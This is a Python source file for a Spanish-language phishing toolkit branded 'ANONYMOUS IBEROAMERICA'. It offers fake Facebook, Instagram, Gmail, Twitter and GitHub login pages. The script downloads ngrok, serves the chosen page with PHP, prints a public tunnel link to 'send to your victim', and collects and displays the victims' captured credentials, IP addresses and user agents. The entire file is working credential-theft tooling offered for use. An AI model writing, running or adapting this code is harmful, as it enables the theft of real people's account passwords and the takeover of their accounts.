def phishing():
    try:
        sitio = input("""
+------------------------------------------------------------+
|MMMMMMMMMMMMMMMMMMMMMMKdc,.      .,cdKMMMMMMMMMMMMMMMMMMMMMM|
|MMMMMMMMMMMMMMMMWOocccldk0KXNNNNXKOkdc:::oOWMMMMMMMMMMMMMMMM|
|MMMMMMMMMMMMMKo::d0WMWNMMMMXdWxkxXOKNXWMW0d:;lKMMMMMMMMMMMMM|
|MMMMMMMMMMXl;l0MMXWkOolXMMMNxWxOxOdOK;lxOKXMW0c,lXMMMMMMMMMM|
|MMMMMMMMK;;OMMK0koxxX0XMMMMMMMMMMMMMWWKKkOdkoMMWk';KMMMMMMMM|
|MMMMMMK;;KMNk:lk0XMMMMWNNNXXXXKXXXNNNWMMMMX0ok:kNMO,;KMMMMMM|
|MMMMMo'0MNkkkxNMMMWNNNWNNNWNWNNMWNNNNWNNNWMMMNxloOWMk.oMMMMM|
|MMMX'cWMXdOdXMMMNXXNWWNWMMNMMNNMMWMMNXWNNNNWMMM0OKx0MW;'XMMM|
|MMN.dMM0cckMMMWXWMMWXNNNNXNNlxc;0NXNNNXNMMMNXWMMMO:lKMMl.XMM|
|MW'dMM0OdKMMMNXMMMMNWMMMNNMWd0l kMNWMMMNNMMMMXNMMMKXOkMMl.WM|
|M:;MMWxkOMMMXNWWWWNXWMMMXWMMMKdWMMMXMMMWXNNWWWNNMMMkK0MMM,;M|
|O XMMx:oWMMNNMMMMWXWWNNXKNNNN:cNNNNXNNNWWKMMMMMNNMMMoOkMMK O|
|;cMMMkdOMMWXMMMMMNWMMMMNXMMMM00MMMMNNMMMMXNMMMMMXMMMOKkMMM;;|
|.OMMK:cNMMNNMMMMMXMMMMMNNMMMNOONWMMWNMMMMNXMMMMMNWMMNc:XMMx.|
| XMMMKxNMMNXWWWWWXNWWWNXOl;MX;,0W:l0XWWWWNXWWWWWXWMMNxOWMM0 |
| XMMk,MMMMNNMMMMMXMO;'.   lMMdlWMl  .';coXXMMMMMNWMMMW.xMM0 |
|.OMM: xMMMMXMMMMMNN.      lMM:.MM:       oNMMMMMXMMMWo :MMd.|
|::MNd 'kOMMNNMMMMNd       .NM. XX        ;WMMMMNWMMok. dXM,;|
|O XO'o.O KWMNNWWWW;        .X. k.        .NWWWNNMWO O,o.00 O|
|M:;Wl :K dl0MNNMMX     ;;,.;;'            KMMNWMkol.O'.kW':M|
|MW'okoc. ,0 kMWNNx    ;lol.;,.            dNNMMx O. ;xxkc'WM|
|MMN.oc.cl:N' ONWW:    o;,;,...            cWWNk ,Xdd:.oc.NMM|
|MMMN,:k;  ':. xcl;         :;:c.          ,lcd .:. .:O,'XMMM|
|MMMMMd'OXccc;'.do          .:l;dcll;:      dd',:lclNk.oMMMMM|
|MMMMMMX:,xc..,;::;          :,.c:o:',    .;::;,..lx';KMMMMMM|
|MMMMMMMMK;,kKl:odxdol.       .,.;co.  :lodxdo:oKx';KMMMMMMMM|
|MMMMMMMMMMXl,ccc,.  .        .lcdl,   ..  .,cc:'lXMMMMMMMMMM|
|MMMMMMMMMMMMMKo;:o0Nd        .ocl'    xMNOo;;oKMMMMMMMMMMMMM|
|MMMMMMMMMMMMMMMMW0o:'         c:.     .;:oOWMMMMMMMMMMMMMMMM|
|MMMMMMMMMMMMMMMMMMMMMM0o;.        .;o0WMMMMMMMMMMMMMMMMMMMMM|
+------------------------------------------------------------+
                    ANONYMOUS IBEROAMERICA\n
                    
-----------------------
01) Facebook
02) Instagram        
03) Gmail
04) Twitter
05) GitHub
------------------------
06) Descargar Ngrok
07) Eliminar Credenciales
08) Ver Credenciales
------------------------
09) Salir

-----------: """)
    except KeyboardInterrupt:
        print("\nEl conocimiento es libre\n")
        exit()
    if sitio == "01" or sitio == "1":
        sitio = "facebook"
    if sitio == "02" or sitio == "2":
        sitio = "instagram"
    if sitio == "03" or sitio == "3":
        sitio = "gmail"
    if sitio == "04" or sitio == "4":
        sitio = "twitter"
    if sitio == "05" or sitio == "5":
        sitio = "github"
    if sitio == "06" or sitio == "6":
        try:
            import os
            import time
            version = input("""
Selecciona la plataforma:
            
1) Linux [AMD 64 bits]
2) Linux [ARM 64 bits]
3) Linux [AMD 32 bits]
4) Linux [ARM 32 bits]

------: """)
            if version == "01" or version =="1":
                if os.path.exists("ngrok"):
                    os.system("rm ngrok")
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip")
                    time.sleep(10)
                    os.system("unzip ngrok-stable-linux-amd64.zip")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-amd64.zip")
                    os.system("clear")
                    return phishing()
                else:
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip")
                    time.sleep(10)
                    os.system("unzip ngrok-stable-linux-amd64.zip")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-amd64.zip")
                    os.system("clear")
                    return phishing()
            if version == "02" or version =="2":
                if os.path.exists("ngrok"):
                    os.system("rm ngrok")
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz")
                    time.sleep(10)
                    os.system("tar -xvf ngrok-stable-linux-arm64.tgz")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-arm64.tgz")
                    os.system("clear")
                    return phishing()
                else:
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz")
                    time.sleep(10)
                    os.system("tar -xvf ngrok-stable-linux-arm64.tgz")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-arm64.tgz")
                    os.system("clear")
                    return phishing()
            if version == "03" or version =="3":
                if os.path.exists("ngrok"):
                    os.system("rm ngrok")
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip")
                    time.sleep(10)
                    os.system("unzip ngrok-stable-linux-386.zip")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-386.zip")
                    os.system("clear")
                    return phishing()
                else:
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip")
                    time.sleep(10)
                    os.system("unzip ngrok-stable-linux-386.zip")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-386.zip")
                    os.system("clear")
                    return phishing()
            if version == "04" or version =="4":
                if os.path.exists("ngrok"):
                    os.system("rm ngrok")
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
                    time.sleep(10)
                    os.system("unzip ngrok-stable-linux-arm.zip")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-arm.zip")
                    os.system("clear")
                    return phishing()
                else:
                    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
                    time.sleep(10)
                    os.system("unzip ngrok-stable-linux-arm.zip")
                    time.sleep(1)
                    os.system("rm -rf ngrok-stable-linux-arm.zip")
                    os.system("clear")
                    return phishing()
            else:
                import time
                print("Igresa un valor valido")
                time.sleep(2)
                return phishing()
        except KeyboardInterrupt:
            print("\nEl conocimiento es libre\n")
            exit()
        except:
            print("Asegurate de que tengas los siguientes requerimientos: wget, unzip, tar.")
    if sitio == "07" or sitio == "7":
        try:
            import os
            import time
            eliminar = input("""
Eliminar Credenciales de:

01) Facebook 
02) Instagram
03) Gmail
04) Twitter
05) GitHub
-------: """)
            if eliminar == "01" or eliminar == "1":
                eliminar = "facebook"
            if eliminar == "02" or eliminar == "2":
                eliminar = "instagram"
            if eliminar == "03" or eliminar == "3":
                eliminar = "gmail"
            if eliminar == "04" or eliminar == "4":
                eliminar = "twitter"
            if eliminar == "05" or eliminar == "5":
                eliminar = "github"
        
            os.system(f"rm -f paginas/{eliminar}/Credenciales.txt")
            print("Se ha eliminado correctamente.")
            time.sleep(2)
            return phishing()
        except KeyboardInterrupt:
            print("\nEl conocimiento es libre\n")
            exit()
    if sitio == "08" or sitio == "8":
        import os
        import time
        ver = input("""
Ver credenciales de:

01) Facebook 
02) Instagram
03) Gmail
04) Twitter
05) GitHub
------: """)
        if ver == "01" or ver == "1":
            ver = "facebook"
        if ver == "02" or ver == "2":
            ver = "instagram"
        if ver == "03" or ver == "3":
            ver = "gmail"
        if ver == "04" or ver == "4":
            ver = "twitter"
        if ver == "05" or ver == "5":
            ver  = "github"

        if os.path.exists(f"paginas/{ver}/Credenciales.txt") == False:
            print("El archivo 'Credenciales.txt' no existe aun.")
            time.sleep(3)
            return phishing()
         
        abrir = open(f"paginas/{ver}/Credenciales.txt")
        leer = abrir.read()

        print(leer)
        exit()
    if sitio == "09" or sitio == "9":
        exit()
    elif sitio == "":
        import time
        import os
        print("Ingresa un valor valido")
        time.sleep(1)
        os.system("clear")
        return phishing()    
        
    try:
        try:
            import sys
            import time
            import os
            from subprocess import Popen, PIPE

            prueba1 = Popen(['which', 'php'], stdout=PIPE)
            prueba2 = prueba1.communicate()[0]
            prueba3 = prueba2.rstrip(b'\n',).rstrip(b"b")
            if str(prueba3) == "b'/usr/bin/php'" or str(prueba3) == "b'/bin/php'":
                try:
                    host = input("\nEscriba el host [Default: 127.0.0.1]: ")
                    if host == "":
                        host = "127.0.0.1"
                    puerto = input("Escriba un puerto para el servicio PHP [Default: 3334]: ")
                    if puerto == "":
                        puerto = "3334"
                    if os.path.exists("ngrok") == False:
                        print("\nDescarga ngrok.\n")
                        exit()
                    os.system(f"./ngrok http {host}:{puerto} > /dev/null &")
                    time.sleep(5)
                    os.chdir(f"paginas/{sitio}/")
                    os.system(f"php -S {host}:{puerto} > /dev/null 2>&1 &")
                    print("\nEnvia esto a tu victima:"), os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n')
                    while True:
                        if os.path.exists("temporal.txt"):
                            a = open("temporal.txt", "r")
                            b = a.read()
                            print(f"\n[{sitio.capitalize()}]")
                            print(b)
                            os.system("rm -rf temporal.txt")
                            os.system("rm -rf IP.txt")
                            os.system("rm -rf AGENTE.txt")
                except FileNotFoundError:
                        print("\nSelecciona una opcion valida, ej: 01, 02, 03...\n")
                        
                except KeyboardInterrupt:
                    try:
                        def respuesta():
                            respuesta1 = input(f"\nDesea dejar los servicios en segundo plano?(Las credenciales se guardan en /paginas/{sitio}/Credenciales.txt) S/n: ")
                            if respuesta1 == "S" or respuesta1 == "s":
                                os.system(f"php -S {host}:{puerto} > /dev/null 2>&1 &")
                             
                                os.system(f"./ngrok http {host}:{puerto} > /dev/null &")
                            if respuesta1 == "N" or respuesta1 == "n":
                                os.system("rm -rf temporal.txt")
                                os.system("rm -rf IP.txt")
                                os.system("rm -rf AGENTE.txt")
                                print("\nEl conocimiento es libre\n")
                                os.system("pkill php")
                                os.system("pkill ngrok")
                                os.system("pkill python3")
                            else:
                                print("\ningresa un caracter valido")
                                respuesta()
                        respuesta()
                    except UnboundLocalError:
                        "No ha asignado el host y puerto."
        
            else:
                print("instalando php...")
                os.system("sudo apt-get install php")
                return phishing()
        except ModuleNotFoundError:
            print("Ha ocurrido un error en los modulos")
    

    except KeyboardInterrupt:
        print("\nEl conocimiento es libre")
        os.system("pkill php")
        os.system("pkill ngrok")
        os.system("pkill python3")
    
    
    

if __name__ == "__main__":
    phishing()

